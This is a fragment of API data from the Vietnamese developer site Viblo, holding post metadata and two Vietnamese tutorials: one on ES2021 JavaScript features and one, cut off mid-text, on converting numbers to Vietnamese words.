<3 <3",
      published_at: "2021-02-22 22:44:47",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 7,
      points: 1,
      views_count: 264,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/6c6c54c9-b4af-4a8c-85e0-22874bba1e45.jpg",
      user: {
        data: {
          id: 25945,
          url: "https://viblo.asia/u/hoanglocdn95",
          avatar: "adccba89-ee3e-48ff-a1e9-05083382a980.jpg",
          name: "Bloody C\u00f4 T\u1ebfch",
          username: "hoanglocdn95",
          followers_count: 9,
          reputation: 312,
          posts_count: 20,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "mobile-app",
            name: "Mobile App",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Mobile+App&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "android",
            name: "Android",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Android&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "react-native",
            name: "React Native",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=React+Native&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 51009,
      title:
        "M\u1ed9t s\u1ed1 t\u00ednh n\u0103ng n\u1ed5i b\u1eadt trong javascript ES12 2021",
      slug: "RQqKLqwNZ7z",
      url:
        "https://viblo.asia/p/mot-so-tinh-nang-noi-bat-trong-javascript-es12-2021-RQqKLqwNZ7z",
      user_id: 22122,
      moderation: null,
      transliterated: "mot-so-tinh-nang-noi-bat-trong-javascript-es12-2021",
      contents_short:
        "M\u1ed9t s\u1ed1 t\u00ednh n\u0103ng n\u1ed5i b\u1eadt trong javascript ES12\n1. Gi\u1edbi thi\u1ec7u\n2. Private Accessors\n3. Promise.any() v\u00e0 AggregateError\n4. Numeric Separators\n5. String.prototype.replaceAll()\n6. Logical Assignment Ope...",
      contents:
        "# M\u1ed9t s\u1ed1 t\u00ednh n\u0103ng n\u1ed5i b\u1eadt trong javascript ES12\n1. Gi\u1edbi thi\u1ec7u\n2. Private Accessors\n3. Promise.any() v\u00e0 AggregateError\n4. Numeric Separators\n5. String.prototype.replaceAll()\n6. Logical Assignment Operators\n7. K\u1ebft lu\u1eadn\n## 1. Gi\u1edbi thi\u1ec7u\n-  ES12 2021 \u0111ang \u1edf giai \u0111o\u1ea1n 4 v\u00e0 d\u1ef1 ki\u1ebfn ra m\u1eaft v\u00e0o n\u0103m nay v\u1edbi nhi\u1ec1u t\u00ednh n\u0103ng h\u1eefu \u00edch.\n-  N\u00f3 cho ph\u00e9p ch\u00fang ta d\u1ec5 d\u00e0ng s\u1eed d\u1ee5ng, ti\u1ebft ki\u1ec7m th\u1eddi gian v\u00e0 gi\u00fap code d\u1ec5 \u0111\u1ecdc h\u01a1n r\u1ea5t nhi\u1ec1u.\n-  Nh\u1eefng t\u00ednh n\u0103ng n\u1ed5i b\u1eadt n\u00e0y s\u1ebd \u0111\u01b0\u1ee3c li\u1ec7t k\u00ea trong b\u00e0i vi\u1ebft d\u01b0\u1edbi \u0111\u00e2y.\n## 2. Private Accessors\n- C\u00e1c ch\u1ee9c n\u0103ng c\u1ee7a accessors c\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c \u0111\u1eb7t \u1edf ch\u1ebf \u0111\u1ed9 private b\u1eb1ng c\u00e1ch vi\u1ebft # tr\u01b0\u1edbc function\n\nv\u00ed d\u1ee5: \n```\nclass Cat {\n  // Public accessor\n  get cat_name() { return \"Luchi\" }\n  set cat_name(value) {}\n\n  // Private accessor\n  get #cat_age() { return 2 }\n  set #cat_age(value) {}\n}\n```\n\n- get v\u00e0 set trong \u0111o\u1ea1n m\u00e3 tr\u00ean l\u00e0 t\u1eeb kh\u00f3a t\u1ea1o n\u00ean cat_name() m\u1ed9t thu\u1ed9c t\u00ednh truy c\u1eadp. M\u1eb7c d\u00f9 cat_name() tr\u00f4ng gi\u1ed1ng nh\u01b0 m\u1ed9t h\u00e0m, n\u00f3 c\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c \u0111\u1ecdc nh\u01b0 m\u1ed9t thu\u1ed9c t\u00ednh b\u00ecnh th\u01b0\u1eddng nh\u01b0 sau:\n```\nconst obj = new Cat();\nconsole.log(obj.cat_name); // \"Luchi\"\nconsole.log(obj.cat_age); // undefined\n```\n## 3. Promise.any() v\u00e0 AggregateError\n- Promise.any() \u0111\u01b0\u1ee3c g\u1ecdi ngay sau khi b\u1ea5t k\u1ef3 promise n\u00e0o \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n ho\u1eb7c t\u1ea5t c\u1ea3 ch\u00fang \u0111\u1ec1u b\u1ecb reject.\n\n```\nPromise.any([\n  fetch('https://dantri.com/').then(() => 'dantri'),\n  fetch('https://facebook.com/').then(() => 'facebook'),\n  fetch('https://volam2.vn/').then(() => 'volam2')\n]).then((first) => {\n  // Any of the promises was fulfilled.\n  console.log(first);\n  // -> 'dantri'\n}).catch((error) => {\n  // All of the promises were rejected.\n  console.log(error);\n})\n```\n\n- Trong m\u00e3 tr\u00ean \u0111ang \u0111\u01b0ua ra ba y\u00eau c\u1ea7u \u0111\u1ed3ng th\u1eddi. Khi m\u1ed9t trong c\u00e1c y\u00eau c\u1ea7u \u0111\u01b0\u1ee3c gi\u1ea3i quy\u1ebft, Promise.any c\u0169ng \u0111\u01b0\u1ee3c gi\u1ea3i quy\u1ebft v\u00e0 ghi l\u1ea1i y\u00eau c\u1ea7u \u0111\u00e3 \u0111\u01b0\u1ee3c gi\u1ea3i quy\u1ebft \u0111\u1ea7u ti\u00ean trong b\u1ea3ng \u0111i\u1ec1u khi\u1ec3n (trong v\u00ed d\u1ee5 tr\u00ean l\u00e0 dantri).\n- N\u1ebfu t\u1ea5t c\u1ea3 nh\u1eefng promises \u0111\u00e3 b\u1ecb reject, Promise.any s\u1ebd n\u00e9m ra m\u1ed9t exception m\u1edbi c\u1ee7a l\u1ed7i: AggregateError.\n- \u0110i\u1ec3m m\u1edbi v\u1ec1 n\u00f3 l\u00e0 \u0111\u1ed1i t\u01b0\u1ee3ng AggregateError \u0111\u1ea1i di\u1ec7n cho m\u1ed9t l\u1ed7i trong \u0111\u00f3 m\u1ed9t s\u1ed1 l\u1ed7i \u0111\u01b0\u1ee3c g\u00f3i g\u1ecdn trong m\u1ed9t l\u1ed7i duy nh\u1ea5t.\n- N\u00f3 s\u1ebd tr\u00f4ng nh\u01b0 th\u1ebf n\u00e0y:\n\n```\nPromise.any([\n  Promise.reject(new Error(\"error 1\")),\n  Promise.reject(new Error(\"error 2\")),\n  Promise.reject(new Error(\"error 3\")),\n]).then((first) => {\n  console.log(first);\n}).catch((error) => {\n  console.log(e.message);  // \"All Promises rejected\"\n  console.log(e.name);     // \"AggregateError\"\n  console.log(e.errors);   // [ Error: \"error 1\", Error: \"error 2\", Error: \"error 3\" ]\n})\n```\n\n- \u1edf tr\u00ean e.errors l\u00e0 m\u1ed9t m\u1ea3ng c\u1ee7a \u0111\u1ed1i t\u01b0\u1ee3ng errors.\n## 4. Numeric Separators\n- Khi ch\u00fang ta l\u00e0m vi\u1ec7c v\u1edbi nh\u01b0ng con s\u1ed1 l\u1edbn c\u00f3 th\u1ec3 g\u1eb7p kh\u00f3 kh\u0103n ho\u1eb7c kh\u00f3 hi\u1ec3u. V\u00ed d\u1ee5:  \"21989854\". Ph\u1ea3i nh\u00ecn th\u1eadt k\u0129 m\u1edbi th\u1ea5y \u0111\u00e2y l\u00e0 21 tri\u1ec7u v\u00e0 ...\n- V\u1edbi t\u00ednh n\u0103ng m\u1edbi c\u1ee7a ES2021, ch\u00fang ta c\u00f3 th\u1ec3 vi\u1ebft l\u1ea1i v\u1edbi d\u1ea5u g\u1ea1ch d\u01b0\u1edbi \u0111\u1ec3 d\u1ec5 d\u00e0ng nh\u1eadn bi\u1ebft h\u01a1n nh\u01b0 sau \u201c21_989_854\u201d. Nh\u00ecn v\u00e0o ch\u00fang ta c\u00f3 th\u1ec3 th\u1ea5y n\u00f3 \u0111\u00e3 d\u1ec5 nh\u1eadn bi\u1ebft h\u01a1n r\u1ea5t nhi\u1ec1u. B\u00e2y gi\u1edd, ch\u00fang ta c\u00f3 th\u1ec3 th\u1ea5y r\u00f5 r\u00e0ng \u0111\u00f3 l\u00e0 21 tri\u1ec7u.\n- Do \u0111\u00f3, t\u00ednh n\u0103ng Numeric Separators c\u00f3 t\u00e1c d\u1ee5ng \u0111\u01a1n gi\u1ea3n l\u00e0 \u0111\u1ec3 c\u1ea3i thi\u1ec7n kh\u1ea3 n\u0103ng \u0111\u1ecdc. N\u00f3 kh\u00f4ng \u1ea3nh h\u01b0\u1edfng \u0111\u1ebfn hi\u1ec7u su\u1ea5t c\u1ee7a \u1ee9ng d\u1ee5ng c\u1ee7a ch\u00fang ta.\n```\n// previous syntax before ES12\nconst money = 1248723742;\n\n// new syntax coming with ES12\nconst money = 1_248_723_742;\n```\n\n- Nh\u00ecn v\u00e0o v\u00ed d\u1ee5 tr\u00ean ch\u00fang ta \u0111\u00e3 th\u1ea5y n\u00f3 \u0111\u00e3 d\u1ec5 \u0111\u1ecdc h\u01a1n r\u1ea5t nhi\u1ec1u.\n\n## 5. String.prototype.replaceAll()\n- \u1ede ES12 replaceAll \u0111\u01b0\u1ee3c t\u1ed1i gi\u1ea3n c\u00e1ch s\u1eed d\u1ee5ng h\u01a1n nhi\u1ec1u so v\u1edbi tr\u01b0\u1edbc \u0111\u00e2y, thay v\u00ec s\u1eed d\u1ee5ng regex ch\u00fang ta c\u00f3 c\u00fa ph\u00e1p \u0111\u01a1n gi\u1ea3n h\u01a1n.\n```\n// previous syntax before ES12\nconst fullname = 'fullname = Nguyen + Xuan + Hung'; \nconst fullnameFormated = fullname.replace (/ \\ + / g, '');\n// Nguyen Xuan Hung\n\n// new syntax coming with ES12\nconst fullname = 'fullname = Nguyen + Xuan + Hung'; \nconst fullnameFormated = fullname.replaceAll ('+', '');\n// Nguyen Xuan Hung\n```\n\n## 6. Logical Assignment Operators\n- V\u1edbi ES12, s\u1ebd c\u00f3 s\u1ef1 k\u1ebft h\u1ee3p gi\u1eef to\u00e1n t\u1eed logic v\u00e0  bi\u1ec3u th\u1ee9c g\u00e1n:\n```\na || = b \n// T\u01b0\u01a1ng \u0111\u01b0\u01a1ng v\u1edbi: a || (a = b), ch\u1ec9 g\u00e1n n\u1ebfu a l\u00e0 Falsy.\na && = b \n// T\u01b0\u01a1ng \u0111\u01b0\u01a1ng v\u1edbi: a && (a = b), ch\u1ec9 g\u00e1n n\u1ebfu a l\u00e0 Truthy.\na ?? = b \n// T\u01b0\u01a1ng \u0111\u01b0\u01a1ng v\u1edbi: a ?? (a = b), ch\u1ec9 g\u00e1n n\u1ebfu a l\u00e0 Nullish.\n```\n## 7. K\u1ebft lu\u1eadn\n- \u0110\u00e2y l\u00e0 nh\u1eefng ch\u1ee9c n\u0103ng m\u1edbi c\u1ee7a ES12 m\u00ecnh t\u00ecm hi\u1ec3u \u0111\u01b0\u1ee3c, c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o th\u00eam d\u01b0\u1edbi \u0111\u00e2y:\n+ https://js.plainenglish.io/javascript-es2021-es12-new-features-7aa5f411d81f\n+ https://backbencher.dev/javascript/es2021-new-features\n+ https://www.pullrequest.com/blog/javascript-es2021-you-need-to-see-these-es12-features/\n+ https://medium.com/better-programming/the-top-3-new-javascript-es-2021-es-12-features-im-excited-about-a3ac129efbb2",
      published_at: "2021-02-22 20:01:48",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 3,
      points: 3,
      views_count: 282,
      clips_count: 1,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 22122,
          url: "https://viblo.asia/u/nguyenxuanhungfr",
          avatar: "721cd2e6-f44c-44c0-b1c8-6e16ccbda81a.png",
          name: "Nguyen Xuan Hung",
          username: "nguyenxuanhungfr",
          followers_count: 9,
          reputation: 423,
          posts_count: 29,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 50926,
      title:
        "B\u00e0i to\u00e1n \u0111\u1ecdc s\u1ed1 th\u00e0nh ch\u1eef (ph\u1ea7n 2) - Ho\u00e0n ch\u1ec9nh ch\u01b0\u01a1ng tr\u00ecnh d\u01b0\u1edbi 100 d\u00f2ng code",
      slug: "E375z6wd5GW",
      url:
        "https://viblo.asia/p/bai-toan-doc-so-thanh-chu-phan-2-hoan-chinh-chuong-trinh-duoi-100-dong-code-E375z6wd5GW",
      user_id: 44447,
      moderation: null,
      transliterated:
        "bai-toan-doc-so-thanh-chu-phan-2-hoan-chinh-chuong-trinh-duoi-100-dong-code",
      contents_short:
        "Ti\u1ebfp t\u1ee5c b\u00e0i vi\u1ebft c\u00f2n dang d\u1edf \u1edf ph\u1ea7n tr\u01b0\u1edbc Ph\u00e2n t\u00edch b\u00e0i to\u00e1n \u0111\u1ecdc s\u1ed1 th\u00e0nh ch\u1eef (ph\u1ea7n 1) - Ph\u00e2n t\u00edch \u0111\u1ec1 v\u00e0 nh\u1eefng m\u1ea3nh gh\u00e9p \u0111\u1ea7u ti\u00ean. B\u1ea1n n\u00e0o ch\u01b0a \u0111\u1ecdc th\u00ec c\u00f3 th\u1ec3 xem \u1edf link tr\u00ean tr\u01b0\u1edbc nh\u00e9.\n\nTheo \u0111\u00f3 c...",
      contents:
        'Ti\u1ebfp t\u1ee5c b\u00e0i vi\u1ebft c\u00f2n dang d\u1edf \u1edf ph\u1ea7n tr\u01b0\u1edbc [Ph\u00e2n t\u00edch b\u00e0i to\u00e1n \u0111\u1ecdc s\u1ed1 th\u00e0nh ch\u1eef (ph\u1ea7n 1) - Ph\u00e2n t\u00edch \u0111\u1ec1 v\u00e0 nh\u1eefng m\u1ea3nh gh\u00e9p \u0111\u1ea7u ti\u00ean](https://viblo.asia/p/bai-toan-doc-so-thanh-chu-phan-1-phan-tich-de-va-nhung-manh-ghep-dau-tien-6J3Zg0OBlmB). B\u1ea1n n\u00e0o ch\u01b0a \u0111\u1ecdc th\u00ec c\u00f3 th\u1ec3 xem \u1edf link tr\u00ean tr\u01b0\u1edbc nh\u00e9.\n\nTheo \u0111\u00f3 ch\u00fang ta \u0111\u00e3 x\u00e2y d\u1ef1ng \u0111\u01b0\u1ee3c **khung s\u01b0\u1eddn** \u0111\u1ec3 gi\u1ea3i quy\u1ebft b\u00e0i to\u00e1n:\n\n* Chia th\u00e0nh t\u1eebng nh\u00f3m 3 ch\u1eef s\u1ed1 v\u00e0 \u0111\u1ecdc th\u00eam \u0111\u01a1n v\u1ecb cho t\u1eebng nh\u00f3m\n* Gi\u1ea3i ph\u00e1p s\u1eeda l\u1ed7i b\u1ecb th\u1eeba/thi\u1ebfu kho\u1ea3ng tr\u1eafng trong output do g\u00e1n c\u1ee9ng\n\nTi\u1ebfp t\u1ee5c trong ph\u1ea7n sau n\u00e0y, ch\u00fang ta s\u1ebd \u0111i chi ti\u1ebft h\u01a1n v\u1ec1 c\u00e1ch \u0111\u1ecdc s\u1ed1 v\u00e0 l\u1eafp gh\u00e9p c\u00e1c ph\u1ea7n l\u1ea1i th\u00e0nh ch\u01b0\u01a1ng tr\u00ecnh ho\u00e0n ch\u1ec9nh. Okay b\u1eaft \u0111\u1ea7u th\u00f4i.\n\n![](https://images.viblo.asia/949625ed-df7a-4022-85e0-082fbbc335c8.jpg)\n\n## 1. Function \u0111\u1ecdc s\u1ed1 3 ch\u1eef s\u1ed1\n\n\u0110\u00e2y l\u00e0 function \u0111\u1ecdc s\u1ed1 c\u00f3 3 ch\u1eef s\u1ed1 t\u1eeb b\u00e0i tr\u01b0\u1edbc. Function n\u00e0y nh\u1eadn v\u00e0o ba tham s\u1ed1 `a`, `b`, `c`. Nhi\u1ec7m v\u1ee5 h\u00f4m nay l\u00e0 vi\u1ebft th\u00eam code cho n\u00f3 \u0111\u1ec3 in ra c\u00e1c t\u1eeb ho\u00e0n ch\u1ec9nh.\n\n```js\nfunction readThree(a, b, c) {\n    ...\n}\n```\n\nNh\u01b0ng m\u00ecnh v\u1eabn s\u1ebd chia n\u00f3 th\u00e0nh b\u00e0i to\u00e1n nh\u1ecf h\u01a1n, l\u00e0 \u0111\u1ecdc **2 ch\u1eef s\u1ed1 cu\u1ed1i** tr\u01b0\u1edbc. M\u00ecnh kh\u00f4ng chia n\u1eefa, v\u00ec n\u1ebfu chia n\u1eefa s\u1ebd th\u00e0nh function \u0111\u1ecdc 1 ch\u1eef s\u1ed1. N\u1ebfu \u0111\u1ecdc 1 ch\u1eef s\u1ed1 th\u00ec function kh\u00e1 \u0111\u01a1n gi\u1ea3n, nh\u01b0ng side effect kh\u00e1 nhi\u1ec1u n\u00ean m\u00ecnh kh\u00f4ng l\u00e0m.\n\n### 1.1. \u0110\u1ecdc hai ch\u1eef s\u1ed1 cu\u1ed1i\n\nNh\u00ecn s\u01a1 qua th\u00ec h\u00e0m \u0111\u1ecdc 2 ch\u1eef s\u1ed1 s\u1ebd nh\u01b0 sau (do h\u00e0m n\u00e0y ch\u1ec9 d\u00f9ng tr\u00ean 2 ch\u1eef s\u1ed1 cu\u1ed1i, \u0111\u1ec3 h\u00e0m `readThree()` s\u1eed d\u1ee5ng n\u00ean m\u00ecnh \u0111\u1eb7t t\u00ean hai tham s\u1ed1 l\u00e0 `b`, `c`).\n\n```js\n// M\u1ea3ng DIGITS l\u00e0 c\u00e1c t\u1eeb t\u01b0\u01a1ng \u1ee9ng v\u1edbi ch\u1eef s\u1ed1 0-9\nconst DIGITS = [\n    \'kh\u00f4ng\', \'m\u1ed9t\', \'hai\', \'ba\', \'b\u1ed1n\',\n    \'n\u0103m\', \'s\u00e1u\', \'b\u1ea3y\', \'t\u00e1m\', \'ch\u00edn\'\n];\n\n// \u0110\u1ecbnh ngh\u0129a function \u0111\u1ecdc hai s\u1ed1 cu\u1ed1i\nfunction readTwo(b, c) {\n    const output = [];\n    \n    switch (b) {\n        case 0: {\n            // Tr\u01b0\u1eddng h\u1ee3p ngo\u1ea1i l\u1ec7 b\u00e0n \u1edf d\u01b0\u1edbi \u1edf \u0111\u00e2y\n            output.push(DIGITS[c]);\n            break;\n        }\n        \n        case 1: {\n            // Tr\u01b0\u1eddng h\u1ee3p s\u1ed1 h\u00e0ng ch\u1ee5c l\u00e0 10\n            output.push("m\u01b0\u1eddi");\n            if (c == 5)\n                output.push("l\u0103m");  // M\u01b0\u1eddi l\u0103m\n            else if (c != 0)\n                output.push(DIGITS[c]);\n            // Tr\u01b0\u1eddng h\u1ee3p c = 0 kh\u00f4ng x\u00e9t v\u00ec \u0111\u00e3 \u0111\u1ecdc "m\u01b0\u1eddi" r\u1ed3i\n            break;\n        }\n        \n        default: {\n            output.push(DIGITS[b], "m\u01b0\u01a1i");  // b m\u01b0\u01a1i\n            if (c == 1)\n                output.push("m\u1ed1t");\n                \n            // Ch\u1ed7 n\u00e0y \u0111\u1ecdc "t\u01b0" hay "b\u1ed1n" th\u00ec c\u00e1c b\u1ea1n \u0111i\u1ec1u ch\u1ec9nh nhe\n            // M\u00ecnh s\u1ebd lu\u00f4n \u0111\u1ecdc l\u00e0 "t\u01b0" nh\u00e9\n            else if (c == 4)\n                output.push("t\u01b0");\n            else if (c == 5)\n                output.push("l\u0103m");\n             else if (c != 0)\n                 output.push(DIGITS[c]);\n            // Kh\u00f4ng \u0111\u1ecdc c = 0 v\u00ec \u0111\u00e3 \u0111\u1ecdc "b m\u01b0\u01a1i" r\u1ed3i\n            break;\n        }\n    }\n    \n    // Tr\u1ea3 v\u1ec1 m\u1ea3ng output, xem l\u1ea1i ph\u1ea7n tr\u01b0\u1edbc nh\u00e9\n    return output;\n}\n```\n\nSorry v\u00ec tr\u00ecnh m\u00ecnh h\u01a1i g\u00e0 n\u00ean ch\u1ec9 bi\u1ebft d\u00f9ng `if else` th\u00f4i. B\u1ea1n n\u00e0o c\u00f3 c\u00e1ch hay h\u01a1n comment xu\u1ed1ng b\u00ean d\u01b0\u1edbi cho m\u00ecnh v\u00e0 m\u1ecdi ng\u01b0\u1eddi tham kh\u1ea3o nh\u00e9 :heart_eyes:\n\n### 1.2. X\u1eed l\u00fd hai tr\u01b0\u1eddng h\u1ee3p ngo\u1ea1i l\u1ec7\n\nTuy nhi\u00ean, d\u1ec5 th\u1ea5y v\u1edbi tr\u01b0\u1eddng h\u1ee3p s\u1ed1 **nh\u1ecf h\u01a1n 10**, ngh\u0129a l\u00e0 `b = 0` th\u00ec c\u00f3 hai ngo\u1ea1i l\u1ec7 sau:\n\n* N\u1ebfu c\u00f3 ch\u1eef s\u1ed1 h\u00e0ng tr\u0103m, v\u00ed d\u1ee5 `103` th\u00ec hai s\u1ed1 cu\u1ed1i \u0111\u1ecdc l\u00e0 `(m\u1ed9t tr\u0103m) l\u1ebb ba`.\n* N\u1ebfu c\u1ea3 `b = 0` v\u00e0 `c = 0` th\u00ec kh\u00f4ng \u0111\u1ecdc, v\u00ed d\u1ee5 `200` hai s\u1ed1 cu\u1ed1i \u0111\u1ecdc l\u00e0 `(hai tr\u0103m) ...`\n\nDo \u0111\u00f3, ch\u00fang ta c\u1ea7n th\u00eam m\u1ed9t tham s\u1ed1 n\u1eefa \u0111\u1ec3 t\u00ednh \u0111\u1ebfn hai tr\u01b0\u1eddng h\u1ee3p tr\u00ean. Code \u0111\u01b0\u1ee3c s\u1eeda l\u1ea1i nh\u01b0 sau.\n\n```js\n// \u0110\u1ecbnh ngh\u0129a function \u0111\u1ecdc hai s\u1ed1 cu\u1ed1i\nfunction readTwo(b, c, hasHundred) {\n    ...\n    switch (b) {\n        case 0: {\n            // N\u1ebfu c\u00f3 \u0111\u1ecdc h\u00e0ng tr\u0103m (\u0111\u1ecdc r\u1ed3i) v\u00e0 b = 0, c = 0\n            // th\u00ec kh\u00f4ng \u0111\u1ecdc n\u1eefa\n            if (hasHundred && c == 0)\n                break;\n            if (hasHundred)\n                output.push("l\u1ebb");  // v\u00ed d\u1ee5 a05 \u0111\u1ecdc l\u00e0 "a l\u1ebb n\u0103m"\n            output.push(DIGITS[c]);\n            break;\n        }\n        ...\n    }\n    ...\n}\n```\n\n### 1.3. \u0110\u1ecdc nh\u00f3m 3 ch\u1eef s\u1ed1\n\nFunction `readThree()` n\u00e0y s\u1ebd s\u1eed d\u1ee5ng function `readTwo()` \u1edf tr\u00ean \u0111\u1ec3 \u0111\u1ecdc hai s\u1ed1 cu\u1ed1i l\u00e0 `b`, `c` nh\u01b0 sau.\n\n```js\n// \u0110\u1ecbnh ngh\u0129a function \u0111\u1ecdc nh\u00f3m 3 s\u1ed1\nfunction readThree(a, b, c) {\n    const output = [];\n\n    // \u0110\u1ecdc ph\u1ea7n tr\u0103m (a) tr\u01b0\u1edbc\n    if (a != 0)\n        output.push(DIGITS[a], \'tr\u0103m\');  // \u0110\u1ecdc l\u00e0 "a tr\u0103m"\n    \n    // N\u1ed1i th\u00eam ph\u1ea7n sau (b, c)\n    // \u1ede \u0111\u00e2y d\u00f9ng spread syntax \u0111\u1ec3 n\u1ed1i output\n    output.push(...readTwo(b, c, a != 0));\n\n    return output;\n}\n```\n\n\u1ede \u0111\u00e2y ch\u00fang ta l\u1ea1i c\u00f3 m\u1ed9t ngo\u1ea1i l\u1ec7 n\u1eefa khi so v\u1edbi t\u1eadp m\u1eabu. \u0110\u00f3 l\u00e0 \u1edf \u0111i\u1ec1u ki\u1ec7n `a != 0`. Hi\u1ec7n t\u1ea1i \u1edf code tr\u00ean th\u00ec:\n\n* N\u1ebfu `a != 0` th\u00ec m\u1edbi \u0111\u1ecdc s\u1ed1 h\u00e0ng tr\u0103m (a tr\u0103m)\n* N\u1ebfu `a != 0` th\u00ec m\u1edbi truy\u1ec1n tham s\u1ed1 `hasHundred` l\u00e0 true cho `readTwo()`. N\u1ebfu tham s\u1ed1 `hasHundred` l\u00e0 true, th\u00ec khi s\u1ed1 d\u1ea1ng t\u1eeb 100 t\u1edbi 109, nh\u01b0 103 th\u00ec `readTwo` \u0111\u1ecdc l\u00e0 `m\u1ed9t tr\u0103m l\u1ebb ba` ch\u1ee9 kh\u00f4ng ph\u1ea3i `ba`.\n\nTuy nhi\u00ean, ngo\u1ea1i l\u1ec7 n\u00e0y x\u1ea3y ra gi\u1eefa c\u00e1c nh\u00f3m 3 s\u1ed1 v\u1edbi nhau. \u0110\u1ec3 m\u00ecnh \u0111\u01b0a ra v\u00ed d\u1ee5 th\u1eed l\u00e0 s\u1ed1 `3 015 003`.\n\n* **Kh\u00e1c bi\u1ec7t nh\u00f3m 1 (3) v\u00e0 nh\u00f3m cu\u1ed1i (003) khi \u0111\u1ecdc:** Nh\u00f3m \u0111\u1ea7u ch\u1ec9 \u0111\u1ecdc l\u00e0 "ba", nh\u01b0ng nh\u00f3m cu\u1ed1i ph\u1ea3i \u0111\u1ecdc l\u00e0 "(kh\u00f4ng tr\u0103m l\u1ebb) ba".\n* N\u1ebfu kh\u00f4ng \u0111\u1ecdc nh\u01b0 tr\u00ean th\u00ec s\u1ebd b\u1ecb l\u1ed7i, k\u1ebft qu\u1ea3 l\u1ed7i l\u00e0 "kh\u00f4ng tr\u0103m l\u1ebb ba (tri\u1ec7u) kh\u00f4ng tr\u0103m m\u01b0\u1eddi l\u0103m (ngh\u00ecn) kh\u00f4ng tr\u0103m l\u1ebb ba (\u0111\u01a1n v\u1ecb)"\n* Ho\u1eb7c n\u1ebfu kh\u00f4ng \u0111\u1ecdc "kh\u00f4ng tr\u0103m l\u1ebb" th\u00ec k\u1ebft qu\u1ea3 sai s\u1ebd c\u00f2n l\u00e0 "ba tri\u1ec7u m\u01b0\u1eddi l\u0103m (ngh\u00ecn) ba (\u0111\u01a1n v\u1ecb)". Hai nh\u00f3m \u0111\u1ea7u \u0111\u1ecdc kh\u00e1 \u1ed5n r\u1ed3i nh\u01b0ng nh\u00f3m cu\u1ed1i th\u00ec h\u01a1i t\u00e3 :joy:\n\nDo \u0111\u00f3 ch\u1ee9ng t\u1ecf \u0111i\u1ec1u ki\u1ec7n `a != 0` l\u00e0 ch\u01b0a \u0111\u1ee7 \u0111\u1ec3 x\u1eed l\u00fd hai tr\u01b0\u1eddng h\u1ee3p tr\u00ean. C\u00e1ch x\u1eed l\u00fd l\u00e0 th\u00eam m\u1ed9t tham s\u1ed1 kh\u00e1c l\u00e0 `readZeroHundred` \u0111\u1ec3 xem c\u00f3 b\u1eaft bu\u1ed9c \u0111\u1ecdc ch\u1eef s\u1ed1 h\u00e0ng tr\u0103m kh\u00f4ng.\n\nC\u00e1ch s\u1eeda th\u00ec \u0111\u01a1n gi\u1ea3n th\u00f4i, ch\u1ec9 c\u1ea7n \u0111\u1ed5i l\u1ea1i \u0111i\u1ec1u ki\u1ec7n `a != 0` th\u00e0nh `a != 0 || readZeroHundred` l\u00e0 \u0111\u01b0\u1ee3c.\n\n```js\n\nfunction readThree(a, b, c, readZeroHundred) {\n    const output = [];\n\n    // \u0110\u1ecdc ph\u1ea7n tr\u0103m (a) tr\u01b0\u1edbc\n    if (a != 0 || readZeroHundred)\n        output.push(DIGITS[a], \'tr\u0103m\');  // \u0110\u1ecdc l\u00e0 "a tr\u0103m"\n    \n    // N\u1ed1i th\u00eam ph\u1ea7n sau (b, c)\n    // \u1ede \u0111\u00e2y d\u00f9ng spread syntax \u0111\u1ec3 n\u1ed1i output\n    output.push(...readTwo(b, c, a != 0 || readZeroHundred));\n\n    return output;\n}\n```\n\nTuy nhi\u00ean, l\u00e0m sao bi\u1ebft nh\u00f3m n\u00e0o lu\u00f4n c\u1ea7n \u0111\u1ecdc. Nh\u01b0 v\u00ed d\u1ee5 h\u1ed3i n\u00e3y, nh\u00f3m \u0111\u1ea7u ti\u00ean th\u00ec kh\u00f4ng c\u1ea7n \u0111\u1ecdc, c\u00e1c nh\u00f3m c\u00f2n l\u1ea1i th\u00ec ph\u1ea3i lu\u00f4n \u0111\u1ecdc h\u00e0ng tr\u0103m. Do \u0111\u00f3, gi\u00e1 tr\u1ecb c\u1ee7a `readZeroHundred` qua c\u00e1c nh\u00f3m nh\u01b0 sau.\n\n> 3 - 015 - 003\n> \n> false - true - true - v\u00e0 nhi\u1ec1u true n\u1eefa\n\nDo \u0111\u00f3, khi g\u1ecdi h\u00e0m \u0111\u1ecdc s\u1ed1 th\u00ec d\u1ef1a v\u00e0o ch\u1ec9 s\u1ed1 nh\u00f3m m\u00e0 truy\u1ec1n tham s\u1ed1 `readZeroHundred` cho ph\u00f9 